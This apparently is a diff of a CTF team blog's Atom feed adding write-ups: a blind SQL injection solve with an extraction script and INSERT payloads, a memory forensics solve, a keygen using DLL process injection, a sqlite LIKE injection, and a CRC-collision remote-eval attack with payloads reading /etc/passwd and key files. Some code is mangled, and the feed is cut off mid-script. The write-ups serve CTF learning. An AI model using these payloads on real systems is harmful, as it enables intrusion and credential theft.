@@ -2,15 +2,3091 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
 
   <title><![CDATA[blue-lotus]]></title>
-  <link href="http://www.blue-lotus.net/atom.xml" rel="self"/>
-  <link href="http://www.blue-lotus.net/"/>
-  <updated>2013-09-13T01:33:51+08:00</updated>
-  <id>http://www.blue-lotus.net/</id>
+  <link href="http://www.blue-lotus.net/www/atom.xml" rel="self"/>
+  <link href="http://www.blue-lotus.net/www/"/>
+  <updated>2013-09-13T01:55:52+08:00</updated>
+  <id>http://www.blue-lotus.net/www/</id>
   <author>
     <name><![CDATA[blue-lotus]]></name>
     
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[ASIS CTF Finals 2013 Login]]></title>
+    <link href="http://www.blue-lotus.net/www/asis-ctf-finals-2013-login/"/>
+    <updated>2013-09-03T00:00:00+08:00</updated>
+    <id>http://www.blue-lotus.net/www/asis-ctf-finals-2013-login</id>
+    <content type="html"><![CDATA[<p><a href="http://blog.deadcat.me/writeup/2013/09/01/asis-ctf-finals-2013-login/">http://blog.deadcat.me/writeup/2013/09/01/asis-ctf-finals-2013-login/</a></p>
+
+<p>Description</p>
+
+<pre><code>Login
+
+Points  350     Level   1   Solves  5
+
+Description
+78.38.193.187
+
+Hint:
+$2y$10$HXDsGCYFW5ajuzYO5qcyfOygl5r27BQB5DkL5ZfgoTfPSRMhlUAnG
+</code></pre>
+
+<p>All you can see is a login form, it always has some SQL injection problem.</p>
+
+<p>After a lot of testing, finally we find a time-based blind injection in the username.</p>
+
+<p>Using</p>
+
+<pre><code>1' AND BENCHMARK(5000000,MD5(0x123)) AND ''='
+</code></pre>
+
+<p>then we start to using sqlmap to deal with it, but it is too slow and show some mistakes.</p>
+
+<p>One of my friend write a python script to solve it, then we find some useful infomation. There are three database:</p>
+
+<pre><code>information_schema
+sqli_db
+test
+</code></pre>
+
+<p>Obviously, sqli_db is suspicious, let&#8217;s see what it has.</p>
+
+<pre><code>users
+</code></pre>
+
+<p>It only has a table named users.</p>
+
+<pre><code>user_id
+user_name
+user_email
+user_password_hash
+</code></pre>
+
+<p>At the beginning, we trying to fetch some data from it, but it is empty, some time later, we fetch a string from user&#95;password&#95;hash.</p>
+
+<pre><code>$2y$10$gyI0vxnE3ZncmdLNGVmwTew/aPwBZPY4cEMCRENAjN4?0l8iu9O5R6iW
+</code></pre>
+
+<p>Just google &#8220;$2y$10&#8243;, we find it is the head of PHP blowfish hash, but it seems that there is no way to get the original value from it.</p>
+
+<p>At that time, the admin give a hint on this problem:</p>
+
+<pre><code>Hint:
+$2y$10$HXDsGCYFW5ajuzYO5qcyfOygl5r27BQB5DkL5ZfgoTfPSRMhlUAnG
+</code></pre>
+
+<p>At the same time, we find that the table users suddenly become empty. It inspire us to try INSERT.</p>
+
+<pre><code>';insert into users values (333,'hqd','1','1@1.com');select '
+</code></pre>
+
+<p>And it works!</p>
+
+<p>Then it is so easy, just INSERT the correct hash value of a password u know it before, there is a php script can to do this.</p>
+
+<pre><code>';insert into users values (333,'hqd','$2y$10$YTNlM2RiNmFiODgzZGM2YuYqP7NHnuZ31TyucetPJkODqia/XH5KC','1@1.com');select '
+
+#this is the blowfish hash value of 'admin'
+</code></pre>
+
+<p>Then just login use username:hqd and password:admin, then here is the flag.</p>
+
+<pre><code>ASIS_9689926853009CAAD5BF824863077DC9
+</code></pre>
+
+<p>And taste the flavor of the first blood.</p>
+
+<p>f.py</p>
+
+<pre><code>from httplib import HTTPConnection
+
+HTTPConnection._http_vsn_str = 'HTTP/1.0'
+
+def post_payload( payload ):
+    conn = HTTPConnection( '78.38.193.187' )
+    conn.putrequest( 'POST', '/', skip_accept_encoding=True, skip_host=True )
+    conn.putheader( 'Content-Type', 'application/x-www-form-urlencoded' )
+    conn.putheader( 'Content-Length', str(len(payload)) )
+    conn.endheaders( message_body=payload )
+    resp = conn.getresponse()
+    resp.read()
+
+from urllib import urlencode
+from time import time
+
+def get_bool( expression ):
+    start = time()
+    post_payload( urlencode( dict(
+        login = '',
+        user_password = ' ',
+        user_name = "'OR if(%s,benchmark(1500000,md5(0)),0) AND''='" % expression,
+    ) ) )
+    end = time()
+    print 'Time:', end-start
+    return end-start&amp;gt;0.95
+
+def get_bit( expression ):
+    return '1' if get_bool( expression ) else '0'
+
+from itertools import count
+
+def get_string( expression ):
+    result = ''
+    for i in count( start=1 ):
+        char = ''
+        for j in range(8)[::-1]:
+            print 'Byte %d, Bit %d,' % (i,j),
+            bit = get_bit( 'ascii(substr(%s,%d,1))&amp;gt;&amp;gt;%d&amp;amp;1' % ( expression, i, j ) )
+            print bit
+            char += bit
+        char = int( char, 2 )
+        if char == 0: break
+        result += chr(char)
+    return result
+
+# def get_query( expression ):
+
+
+# print get_string( 'database()' )
+print get_string( '(SELECT IFNULL(CAST(table_name AS CHAR) ,0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c695f6462 LIMIT 0,1)' )
+# print get_string( '(SELECT IFNULL(CAST(table_name AS CHAR) ,0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=\'information_shema\' LIMIT 0,1)' )
+# print get_string( '(SELECT IFNULL(CAST(COLUMN_NAME AS CHAR) ,0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=\'users\' LIMIT 5,1)' )
+# print get_string( '(SELECT CAST(COUNT(*) AS CHAR) FROM users)' )
+# print get_string( '@@datadir' )
+# print get_string( 'user()' )
+# print get_string( 'version()' )
+</code></pre>
+
+<p>a.php</p>
+
+<p>Founded from <a href="http://pastebin.com/y9GKtx0b">pastebin</a></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[ASIS CTF memdump writeup]]></title>
+    <link href="http://www.blue-lotus.net/www/asis-ctf-memdump-writeup/"/>
+    <updated>2013-09-01T00:00:00+08:00</updated>
+    <id>http://www.blue-lotus.net/www/asis-ctf-memdump-writeup</id>
+    <content type="html"><![CDATA[<p>This is my first time to solve memory forensic challenge. I learn to use <a href="https://www.volatilesystems.com/default/volatility">volatility</a> from this <a href="http://blog.lse.epita.fr/articles/59-ebctf-2013-for100.html">post</a>.</p>
+
+<p>Indicated from the memory dump strings, we know the system is <code>Ubuntu 12.04</code> with the kernel of <code>vmlinuz-3.5.0-23-generic</code>. After building a profile (the step by step procedure is <a href="http://code.google.com/p/volatility/wiki/LinuxMemoryForensics">here</a>), we can use the commands in volatility.</p>
+
+<pre><code>$ vol.py --profile=LinuxUbuntu1204x64 -f mem.dump linux_pslist
+...
+0xffff88000acf4500 udevd        8112    0       0      0x000000000d06e000 2013-08-26 12:35:50 UTC+0000
+0xffff88000d54ae00 asis-ctf     9425    1000    1000   0x000000000c8c9000 2013-08-26 12:48:54 UTC+0000
+0xffff88000acf2e00 nano         15584   1000    1000   0x000000000d677000 2013-08-26 13:13:42 UTC+0000
+...
+</code></pre>
+
+<p>We noticed that there is a process called <code>asis-ctf</code>, which seems to provide the flag. Then we dump the executable file from memory of the process.</p>
+
+<pre><code>$ vol.py --profile=LinuxUbuntu1204x64 -f mem.dump linux_proc_maps -p 9425
+Volatile Systems Volatility Framework 2.3_beta
+Pid      Start              End            Flags               Pgoff Major  Minor  Inode      File Path                    
+9425 0x0000000000400000 0x0000000000401000 r-x                   0x0    252      0     393333 /home/netadmin/asis-ctf      
+9425 0x0000000000600000 0x0000000000601000 r--                   0x0    252      0     393333 /home/netadmin/asis-ctf      
+9425 0x0000000000601000 0x0000000000602000 rw-                0x1000    252      0     393333 /home/netadmin/asis-ctf
+...
+$ vol.py --profile=LinuxUbuntu1204x64 -f mem.dump linux_dump_map -p 9425 -D output
+$ hexdump -C -n 10 task.9425.0x600000.vma
+00000000  7f 45 4c 46 02 01 01 00  00 00                    |.ELF......|
+$ cat task.9425.0x600000.vma task.9425.0x601000.vma &gt; asis-ctf
+$ file asis-ctf
+asis-ctf: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), stripped
+</code></pre>
+
+<p>Here we get the ELF file, after doing some RE, we got the flag by runing the script below:</p>
+
+<pre><code>table_s = """42 49 55 52 4c 41 57 4e 64 5f 69 37 69 31 3e 63
+6b 65 6c 33 3b 34 3d 65 3f 65 6f 63 47 31 75 36
+72 66 42 62 4a 65 75 39 49 66 48 34 4d 32 4a 34
+4e 37 4e 32 4d 35 55 65 50 37 82 32 84 61 52 35
+83 39 85 61 53 34 89 39 8b 64 26"""
+table = []
+for c in table_s.replace("\n", " ").split(" "):
+    n = int("0x" + c, 16)
+    table.append(n)
+
+flag = ""
+for i in range(0x25):
+    a = 2 * i
+    c = table[a] - i - 1
+    flag += chr(c)
+print flag
+
+$ python asis-ctf.py
+ASIS_cb6bb012a8ea07a426254293de2bc0ef
+</code></pre>
+
+<p>The ELF file asis-ctf I got from the mem.dump is still not able to run, that&#8217;s why RE is still needed. Does anyone have an idea to extract an runnable asis-ctf from the memory? Please tell me;&ndash;)</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[UFO CTF 2013 Reverse &#8211; KeyGenMe Writeup]]></title>
+    <link href="http://www.blue-lotus.net/www/ufo-ctf-2013-reverse-keygenme-writeup/"/>
+    <updated>2013-08-08T00:00:00+08:00</updated>
+    <id>http://www.blue-lotus.net/www/ufo-ctf-2013-reverse-keygenme-writeup</id>
+    <content type="html"><![CDATA[<p>I would come back with more details of this challenge.</p>
+
+<p>Here is the approach that I used to generate a keygen: make a DLL and inject it into the target process. The source code of my library is as follows.</p>
+
+<pre><code>#include "stdafx.h"
+#include &lt;iostream&gt;
+
+typedef unsigned char byte;
+
+extern HMODULE m_hModule;
+HANDLE m_hConsole;
+
+#pragma pack(1)
+struct CPU_
+{
+    byte al_;
+    unsigned int k_init[4];
+    unsigned int data[4];
+    byte ip_;
+    byte sp_;
+    byte stack[8];
+};
+#pragma pack()
+
+unsigned int step_func[256] = {0x4011D0, 
+    0x401310, 
+    0x401490, 
+    0x401660, 
+    0x4017F0, 
+    0x401940, 
+    0x401AC0, 
+    0x401C90, 
+    0x401DF0, 
+    0x401FA0, 
+    0x402130, 
+    0x4022E0, 
+    0x402460, 
+    0x402660, 
+    0x4027D0, 
+    0x402960, 
+    0x402B50, 
+    0x402CB0, 
+    0x402E40, 
+    0x403010, 
+    0x4031C0, 
+    0x403330, 
+    0x4034D0, 
+    0x4036A0, 
+    0x403840, 
+    0x4039A0, 
+    0x403B00, 
+    0x403C50, 
+    0x403DE0, 
+    0x403F30, 
+    0x4040A0, 
+    0x404260, 
+    0x404430, 
+    0x4045F0, 
+    0x404760, 
+    0x404900, 
+    0x404A70, 
+    0x404C30, 
+    0x404DA0, 
+    0x404F40, 
+    0x4050C0, 
+    0x4051E0, 
+    0x405380, 
+    0x4054D0, 
+    0x4056A0, 
+    0x405850, 
+    0x4059D0, 
+    0x405B50, 
+    0x405D10, 
+    0x405E90, 
+    0x406030, 
+    0x406140, 
+    0x4062D0, 
+    0x4064A0, 
+    0x406610, 
+    0x4067A0, 
+    0x406940, 
+    0x406A80, 
+    0x406C20, 
+    0x406DF0, 
+    0x406F90, 
+    0x407110, 
+    0x4072A0, 
+    0x407420, 
+    0x4075A0, 
+    0x407740, 
+    0x407880, 
+    0x407A50, 
+    0x407C00, 
+    0x407DB0, 
+    0x407F80, 
+    0x408120, 
+    0x408290, 
+    0x408410, 
+    0x408570, 
+    0x4086D0, 
+    0x408890, 
+    0x4089D0, 
+    0x408B70, 
+    0x408D20, 
+    0x408EA0, 
+    0x408FE0, 
+    0x409170, 
+    0x4092B0, 
+    0x409490, 
+    0x409640, 
+    0x4097D0, 
+    0x4099A0, 
+    0x409B70, 
+    0x409CC0, 
+    0x409E90, 
+    0x409FE0, 
+    0x40A150, 
+    0x40A290, 
+    0x40A410, 
+    0x40A5D0, 
+    0x40A770, 
+    0x40A8D0, 
+    0x40AA30, 
+    0x40ABA0, 
+    0x40AD20, 
+    0x40AEB0, 
+    0x40B050, 
+    0x40B1B0, 
+    0x40B3B0, 
+    0x40B530, 
+    0x40B6D0, 
+    0x40B860, 
+    0x40BA40, 
+    0x40BBD0, 
+    0x40BD50, 
+    0x40BEB0, 
+    0x40C060, 
+    0x40C1A0, 
+    0x40C370, 
+    0x40C510, 
+    0x40C670, 
+    0x40C7F0, 
+    0x40C990, 
+    0x40CB00, 
+    0x40CCC0, 
+    0x40CE50, 
+    0x40CFF0, 
+    0x40D1C0, 
+    0x40D300, 
+    0x40D460, 
+    0x40D5D0, 
+    0x40D710, 
+    0x40D870, 
+    0x40DA00, 
+    0x40DBD0, 
+    0x40DD60, 
+    0x40DEE0, 
+    0x40E080, 
+    0x40E230, 
+    0x40E3C0, 
+    0x40E550, 
+    0x40E6F0, 
+    0x40E890, 
+    0x40EA10, 
+    0x40EB50, 
+    0x40ED50, 
+    0x40EE60, 
+    0x40EF80, 
+    0x40F0F0, 
+    0x40F2A0, 
+    0x40F400, 
+    0x40F560, 
+    0x40F710, 
+    0x40F890, 
+    0x40FA30, 
+    0x40FBC0, 
+    0x40FD50, 
+    0x40FE90, 
+    0x410020, 
+    0x410180, 
+    0x410340, 
+    0x4104B0, 
+    0x410620, 
+    0x410780, 
+    0x410930, 
+    0x410B20, 
+    0x410CB0, 
+    0x410E00, 
+    0x410F50, 
+    0x411130, 
+    0x411310, 
+    0x4114B0, 
+    0x4115F0, 
+    0x411730, 
+    0x4118E0, 
+    0x411A40, 
+    0x411BF0, 
+    0x411DA0, 
+    0x411F30, 
+    0x4120F0, 
+    0x412250, 
+    0x4123B0, 
+    0x412560, 
+    0x4126D0, 
+    0x412860, 
+    0x4129F0, 
+    0x412B90, 
+    0x412D30, 
+    0x412F10, 
+    0x413070, 
+    0x413200, 
+    0x4133A0, 
+    0x413510, 
+    0x413660, 
+    0x4137A0, 
+    0x4138D0, 
+    0x413A50, 
+    0x413BC0, 
+    0x413D30, 
+    0x413F00, 
+    0x4140C0, 
+    0x414220, 
+    0x4143A0, 
+    0x4144F0, 
+    0x414630, 
+    0x4147C0, 
+    0x414930, 
+    0x414AC0, 
+    0x414C70, 
+    0x414DD0, 
+    0x414F80, 
+    0x4150E0, 
+    0x4152A0, 
+    0x415430, 
+    0x4155E0, 
+    0x415750, 
+    0x4158C0, 
+    0x415A40, 
+    0x415BD0, 
+    0x415D30, 
+    0x415ED0, 
+    0x416060, 
+    0x416210, 
+    0x416360, 
+    0x416520, 
+    0x416690, 
+    0x416850, 
+    0x4169F0, 
+    0x416B20, 
+    0x416CE0, 
+    0x416E90, 
+    0x417010, 
+    0x417170, 
+    0x417300, 
+    0x417490, 
+    0x417690, 
+    0x417860, 
+    0x417A20, 
+    0x417B70, 
+    0x417D50, 
+    0x417EC0, 
+    0x417FD0, 
+    0x418140, 
+    0x418290, 
+    0x418420, 
+    0x418610, 
+    0x4187C0, 
+    0x418930, 
+    0x418AD0, 
+    0x418C50, 
+    0x418E30, 
+    0x418FD0, 
+    0x419140, 
+    0x419280, 
+    0x419410, 
+    0x4195B0, 
+    0x419710, 
+    0x4198B0, 
+    0x419A00, 
+    0x419B60};
+
+typedef void (__thiscall *__prepare_teamname)(struct CPU_* pCpu, char* szTeamName);
+typedef void (*__tean)(int uDecryptFlag, byte* pSrc, byte* pDst, unsigned int *k, unsigned int length);
+typedef void (__thiscall *__step)(struct CPU_* pCpu, unsigned int operation);
+
+__prepare_teamname prepare_teamname;
+__tean tean;
+__step step[256];
+
+VOID Initialize()
+{
+    prepare_teamname = (__prepare_teamname)0x419d00;
+    tean = (__tean)0x41ed50;
+
+    for(int i = 0; i &lt;= 0xff; ++i)
+    {
+        step[i] = (__step)step_func[i];
+    }
+}
+
+BOOL Search(byte* cmd, int ip, struct CPU_* cpu_, byte* dst_stack, byte* operation, int* final_ip, byte* init_stack)
+{
+    if(ip &gt;= 16)
+    {
+        // Reach the end!
+        if(cpu_-&gt;ip_ &gt;= 32 &amp;&amp; cpu_-&gt;sp_ &gt;= 8)
+        {
+            *final_ip = cpu_-&gt;ip_;
+            return TRUE;
+        }
+        return FALSE;
+    }
+    else if(ip &gt;= 7)
+    {
+        // Do not pop anything onto our stack!
+        // We only try to manipulate the ip
+        for(int i = 1; i &lt;= 0xff; ++i)
+        {
+            struct CPU_ new_cpu;
+            memcpy(&amp;new_cpu, cpu_, sizeof(struct CPU_));
+
+            int old_sp = new_cpu.sp_;
+            // Step
+            step[cmd[ip]](&amp;new_cpu, i);
+            if(old_sp != new_cpu.sp_)
+            {
+                // A new value has been written on stack
+                // return FALSE;
+            }
+            else
+            {
+                if(Search(cmd, ip + 1, &amp;new_cpu, dst_stack, operation, final_ip, init_stack))
+                {
+                    operation[ip] = i;
+                    return TRUE;
+                }
+            }
+        }
+    }
+    else /* if(ip &gt;= 0 &amp;&amp; ip &lt; 7) */
+    {
+        for(int init_stack_byte = 0; init_stack_byte &lt;= 0xff; ++init_stack_byte)
+        {
+            cpu_-&gt;stack[cpu_-&gt;sp_ - 1] = (byte)init_stack_byte;
+
+            for(int i = 1; i &lt;= 0xff; ++i)
+            {
+                struct CPU_ new_cpu;
+                memcpy(&amp;new_cpu, cpu_, sizeof(struct CPU_));
+
+                int old_sp = new_cpu.sp_;
+                // Step
+                step[cmd[ip]](&amp;new_cpu, i);
+                if(old_sp != new_cpu.sp_)
+                {
+                    // A new value has been written on stack
+                    if(new_cpu.stack[new_cpu.sp_ - 2] == dst_stack[new_cpu.sp_ - 2])
+                    {
+                        // Search the next step
+                        char buf[40];
+                        sprintf_s(buf, "sp = %d, init_stack = %x\n", 
+                            new_cpu.sp_ - 2,
+                            init_stack_byte);
+                        WriteConsoleA(m_hConsole, buf, strlen(buf), NULL, NULL);
+                        if(Search(cmd, ip + 1, &amp;new_cpu, dst_stack, operation, final_ip, init_stack))
+                        {
+                            init_stack[new_cpu.sp_ - 2] = init_stack_byte;
+                            operation[ip] = i;
+                            return TRUE;
+                        }
+                    }
+                }
+                else
+                {
+                    // No value is popped onto the stack
+                    /*if(Search(cmd, ip + 1, &amp;new_cpu, dst_stack, operation, final_ip))
+                    {
+                        operation[ip] = i;
+                        return TRUE;
+                    }*/
+                    // return FALSE;
+                }
+            }
+        }
+    }
+
+
+    return FALSE;
+}
+
+VOID Process()
+{
+    struct CPU_ cpu_;
+    memset(&amp;cpu_, 0, sizeof(cpu_));
+
+    AllocConsole();
+    m_hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
+
+    Initialize();
+    WriteConsoleA(m_hConsole, "Initialization finished.\n", strlen("Initialization finished.\n"), NULL, NULL);
+
+    prepare_teamname(&amp;cpu_, "R3V3rZ3 I5 C00L");
+    //prepare_teamname(&amp;cpu_, "blue-lotus");
+
+    char buf[2048];
+    sprintf_s(buf, "CPU k_init = %08x %08x %08x %08x\n", 
+        cpu_.k_init[0], 
+        cpu_.k_init[1],
+        cpu_.k_init[2],
+        cpu_.k_init[3]);
+    WriteConsoleA(m_hConsole, buf, strlen(buf), NULL, NULL);
+
+    char src[] = "CTF_COOL";
+    byte dst[8];
+    tean(1, (byte*)src, dst, cpu_.k_init, 8);
+    sprintf_s(buf, "Standard stack = %08x %08x\n", 
+        *(unsigned int*)dst,
+        *(unsigned int*)(dst + 4));
+    WriteConsoleA(m_hConsole, buf, strlen(buf), NULL, NULL);
+
+    byte k_flipped[16];
+    byte data_flipped[16] = {0};
+    for(int i = 0; i &lt; 8; ++i)
+    {
+        k_flipped[i * 2] = ((byte*)cpu_.k_init)[i * 2 + 1];
+        k_flipped[i * 2 + 1] = ((byte*)cpu_.k_init)[i * 2];
+    }
+
+    struct CPU_ new_cpu;
+    int uFinalIp;
+    byte init_stack[8];
+    init_stack[7] = dst[7];
+    memset(&amp;new_cpu, 0, sizeof(struct CPU_));
+    new_cpu.sp_ = 1;
+    BOOL result = Search(k_flipped, 0, &amp;new_cpu, dst, data_flipped, &amp;uFinalIp, init_stack);
+
+    sprintf_s(buf, "Result = %x, final_ip = %x\n",
+        result,
+        uFinalIp);
+    WriteConsoleA(m_hConsole, buf, strlen(buf), NULL, NULL);
+
+    byte data[25] = {0};
+    // First 16 bytes
+    for(int i = 0; i &lt; 8; ++i)
+    {
+        data[i * 2] = data_flipped[i * 2 + 1];
+        data[i * 2 + 1] = data_flipped[i * 2];
+    }
+    data[16] = (byte)uFinalIp;
+    // 17 ~ 25 bytes
+    for(int i = 17; i &lt; 25; ++i)
+    {
+        data[i] = init_stack[i - 17];
+    }
+
+    // Convert it to keys
+    char szAllowedChars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
+    char final_key[41] = {0};
+    int pos = 0;
+    int key_pos = 0;
+    int bit_left = 0;
+    int s = 0;
+    while(pos &lt; 25)
+    {
+        s = (s &lt;&lt; 8) | data[pos];
+        ++pos;
+        bit_left += 8;
+        while(bit_left &gt;= 5)
+        {
+            int x = (s &gt;&gt; (bit_left - 5)) &amp; 0x1f;
+            final_key[key_pos ++] = szAllowedChars[x];
+            bit_left -= 5;
+        }
+        s = s &amp; 0x1f;
+    }
+    WriteConsoleA(m_hConsole, final_key, strlen(final_key), NULL, NULL);
+}
+
+BOOL WINAPI Inject(DWORD dwProcessID)
+{
+    TCHAR strModulePath[2000] = {0};
+    GetModuleFileName(m_hModule, strModulePath, 2000);
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, dwProcessID);
+    FARPROC farLoadLibrary = GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "LoadLibraryW");
+    LPVOID lpDllAddr = VirtualAllocEx(hProcess, NULL, wcslen(strModulePath) * sizeof(TCHAR), MEM_COMMIT, PAGE_READWRITE); 
+    if(lpDllAddr != NULL)
+    {
+        if(WriteProcessMemory(hProcess, lpDllAddr, strModulePath, wcslen(strModulePath) * sizeof(TCHAR), NULL))
+        {
+            HANDLE hT = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)farLoadLibrary, lpDllAddr, 0, NULL);   
+            CloseHandle(hT);
+            CloseHandle(hProcess);
+            return TRUE;
+        }
+    }
+    return FALSE;
+}
+</code></pre>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[UFOCTF2013 Web100 FlagStore]]></title>
+    <link href="http://www.blue-lotus.net/www/ufoctf2013-web100-flagstore/"/>
+    <updated>2013-07-23T00:00:00+08:00</updated>
+    <id>http://www.blue-lotus.net/www/ufoctf2013-web100-flagstore</id>
+    <content type="html"><![CDATA[<p>It is a very interesting problem and exhausted our much time and energy.</p>
+
+<p>There are 3 levels.All about sqli.</p>
+
+<p>The first level only needs username and password.After trying for several hours with some common sqli like &#8216; or &#8217;1&#8242;=&#8217;1 and so on but all failed,I accidentally found that &#8221; or &#8220;1&#8243;=&#8221;1 made sense.And @fqj use sqlmap to find the true username and level1_password in the database.(sqlmap also told that the database is sqlite).</p>
+
+<p>The second level needs username,level1&#95;password and level2&#95;password.<em>Note that you must back to level 1 and use true username and password to get to level2 again or you&#8217;ll never go ahead anymore</em>.And seeking for more hours,I find that &#8220;%&#8221; in sqlite can match strings(including empty strings) and &#8220;&#95;&#8221; can match single char.In this level,&#8221;%&#8221; is just the payload.And we use &#8220;&#95;&#8221; to brutefoce the true password.</p>
+
+<p>The third level needs level3&#95;password and a confirm for level3&#95;password.And for payload &#8216; or password like &#8216;%&#8217; &#8212; the site told us that password3.1 passed but password3.2 failed.In confirm blank a mistake happened but we know that the sqli took effect.That is enough,by using &#8220;_&#8221; we can bruteforce the true password(if the site told us only password 3.2 failed then it makes sense).</p>
+
+<p>@H.Shao wrote the script to find the password for level2 and level3 and finally got the FLAG.There is trap in level3,because there is &#8220;&#95;&#8221; in the level3&#95;password and this time &#8220;&#95;&#8221; doesnt represent any single char but just &#8220;_&#8221;.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[SIGINT 2013 crypto300 satisfaction]]></title>
+    <link href="http://www.blue-lotus.net/www/sigint-2013-crypto300-satisfaction/"/>
+    <updated>2013-07-10T00:00:00+08:00</updated>
+    <id>http://www.blue-lotus.net/www/sigint-2013-crypto300-satisfaction</id>
+    <content type="html"><![CDATA[<p><a href="http://slipper.tk/writeup/2013/07/11/sigint-2013-crypto-satisfaction/">http://slipper.tk/writeup/2013/07/11/sigint-2013-crypto-satisfaction/</a></p>
+
+<h1><a href="http://slipper.tk/writeup/2013/07/11/sigint-2013-crypto-satisfaction/">SIGINT 2013 crypto300 satisfaction</a></h1>
+
+<p>Description</p>
+
+<pre><code>Something fishy going on:
+you need this
+188.40.147.108 2000
+This flag does not have a SIGINT_ prefix!
+</code></pre>
+
+<p><a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/crypto/satisfaction/server.rb">server.rb</a></p>
+
+<p><a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/crypto/satisfaction/bf.rb">bf.rb</a></p>
+
+<p>The server only runs properly RSA signed brainfuck code.</p>
+
+<pre><code>def valid?(code, cert)
+  return false unless code =~ /\A[\[\]+\-\. ]+\Z/
+  return false unless cert =~ /\A\d+\Z/
+  sig = cert.to_i
+  crc = crc32(code)
+  test = crc.to_bn.mod_exp($d, $n)
+  return sig == test
+end
+
+  if(valid_cert)
+    puts "got valid code: #{code.inspect}"
+    ruby_code = bfdo(code)
+    puts "got some ruby code: #{ruby_code.inspect}"
+    client.puts eval(ruby_code)
+</code></pre>
+
+<p>If the brainfuck code which we submit only contains <code>+-[].</code>, then the sever will calculate the crc of the code and check if it matches the signature.<br/>
+Then how does <code>crc32()</code> work? The code in the script seems different from classic <a href="http://en.wikipedia.org/wiki/Crc32">CRC32</a>.</p>
+
+<pre><code>def crc32(str)
+  mask = 0x04C11DB7
+  crc = 0
+  str.bytes.each do |byte|
+    byte.to_s(2).rjust(8,"0").each_char do |bit|
+      h_crc_bit = ( (( crc &amp;amp; 0x80_00_00_00) != 0) ? 1 : 0)
+      h_byte_bit = bit.to_i
+      if  h_crc_bit == h_byte_bit
+        crc = ((crc &amp;lt;&amp;lt; 1)^mask) &amp;amp; 0xffffffff
+      else
+        crc = (crc &amp;lt;&amp;lt; 1) &amp;amp; 0xffffffff
+      end
+    end
+  end
+  return crc
+end
+</code></pre>
+
+<p>Standard CRC32 is the remainder of a polynomial division of the target string. In practice it employs the finite field GF(2). XOR is equivalent to division in GF(2).<br/>
+As a hash function, CRC32 is easy to collision.<br/>
+In the code above, XOR was taken when <code>h_crc_bit == h_byte_bit</code>.<br/>
+However, in standard CRC32, it should be <code>h_crc_bit == 1 &amp;amp;&amp;amp; h_byte_bit == 1</code><br/>
+Maybe the new crc32 is more likely to collision.</p>
+
+<p>To study this algorithm, I rewrite it in C++.</p>
+
+<pre><code>unsigned int CRC32_bit(unsigned char data[], int len)
+{
+        unsigned int r = 0;
+        unsigned int s;
+        for (int i = 0; i &amp;lt; len; i++) {
+                s = data[i] &amp;lt;&amp;lt; 24;
+                for (int j = 0; j &amp;lt; 8; j++) {
+                        if (!((r ^ s) &amp;amp; 0x80000000))
+                        //instead of if (r &amp;amp; 0x80000000)
+                                r = (r &amp;lt;&amp;lt; 1) ^ POLY;
+                        else
+                                r = r &amp;lt;&amp;lt; 1;
+                        s = s &amp;lt;&amp;lt; 1;
+                }
+        }
+        return r;
+}
+</code></pre>
+
+<p>In this problem, it seems that we can&rsquo;t sign the code because we don&rsquo;t know the constants in <code>./rsa_keys.rb</code>.<br/>
+The basic idea is very simple. If we keep the <code>crc=0</code> or <code>crc=1</code>, then signature is always the same with crc(0 or 1). Now we just need to find something excutable whose crc is 0 or 1.</p>
+
+<p>First we should write a brainfuck program whose output is a legal ruby code, then append some useless character to the code to make its crc be 0 or 1.</p>
+
+<p>A simple brainfuck programmer is like this</p>
+
+<pre><code>def bf(s):
+        p = 0
+        q = 0
+        K = 48
+        ret = &amp;#039;&amp;#039;
+        now = 0
+        for c in s:
+            if ord(c) &amp;lt; K:
+                    if (now != 0):
+                            ret += &amp;#039;&amp;lt;&amp;#039;
+                            now = 0
+                    while (p  ord(c)):
+                            p -= 1
+                            ret += '-'
+            else:                                                                                                                                                                             
+                    if (now != 1):                                                                                                                                                            
+                            ret += '&amp;gt;'                                                                                                                                                        
+                            now = 1                                                                                                                                                           
+                    while (q  ord(c)):
+                            q -= 1
+                            ret += '-'
+            ret += '.'
+    return ret
+</code></pre>
+
+<p>My code is kind of ugly but it does work. (The brainfuck code length is limited to 1000)</p>
+
+<p>Given a crc sum and a byte we can calculate the next crc sum directly.</p>
+
+<pre><code>inline unsigned int extend(unsigned int r, unsigned char s)
+{
+        return (r &amp;lt;&amp;gt; 24) ^ s];
+}
+</code></pre>
+
+<p><code>crc_table</code> is a pre-calculated table.</p>
+
+<p>If the crc sum is 0, then `r &lt;> 8;<br/>
+x |= (i ^ s) &lt;&lt; 24;<br/>
+if (extend(x, s) == r) {<br/>
+//some code<br/>
+}<br/>
+}<br/>
+}</p>
+
+<p>But charset that we can use is limited, so we don&rsquo;t need to worry about too many solutions.</p>
+
+<p>I used a bidirectional search algorithm to speed up my search in my code.<br/>
+<a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/crypto/satisfaction/crc32.cpp">crc32.cpp</a></p>
+
+<p>It works well even I only use <code>+-</code> to generate collisions.</p>
+
+<pre><code>import subprocess
+from time import sleep
+from socket import *
+
+...
+
+if __name__ == '__main__' :
+        s = socket(AF_INET, SOCK_STREAM)
+        s.connect(('188.40.147.108', 2000))
+        print s.recv(1024)
+        #raw = bf("""client.puts File.readlines("/etc/passwd")#""")
+        #raw = bf("""client.puts File.readlines("./the_flag.rb")#""")
+        raw = bf("""client.puts File.readlines("./rsa_keys.rb")#""")
+
